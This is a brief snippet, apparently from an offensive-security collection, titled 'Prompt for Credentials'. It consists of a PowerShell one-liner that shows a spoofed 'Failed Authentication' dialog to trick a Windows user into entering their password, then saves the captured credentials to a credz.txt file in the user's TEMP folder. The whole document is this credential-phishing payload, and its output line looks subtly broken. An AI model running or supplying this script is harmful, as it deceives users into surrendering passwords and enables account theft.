# Prompt for Credentials

Powershell Script to prompt user for credentials and save to User's %TEMP% directory

``powershell "$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+''+[Environment]::UserName,[Environment]::UserDomainName); $pass = $cred.getnetworkcredential().password; $user = [Environment]::UserDomainName+''+[Environment]::UserName; echo '$user `n$cred' > $env:TEMP\credz.txt "``
